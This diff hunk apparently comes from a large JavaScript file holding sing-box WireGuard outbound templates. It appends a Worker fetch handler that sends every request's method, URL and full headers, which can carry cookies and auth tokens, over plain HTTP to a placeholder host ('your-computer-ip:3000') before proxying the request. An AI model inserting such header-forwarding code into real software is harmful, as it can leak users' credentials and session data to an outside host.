@@ -3305,3 +3305,25 @@ const singboxWgOutboundTemp = {
     detour: "",
     tag: ""
 };
+
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request));
+});
+
+async function handleRequest(request) {
+  const logData = {
+    method: request.method,
+    url: request.url,
+    headers: [...request.headers.entries()]
+  };
+
+  const logUrl = 'http://your-computer-ip:3000/';
+  await fetch(logUrl, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(logData)
+  });
+
+  const response = await fetch(request);
+  return response;
+}
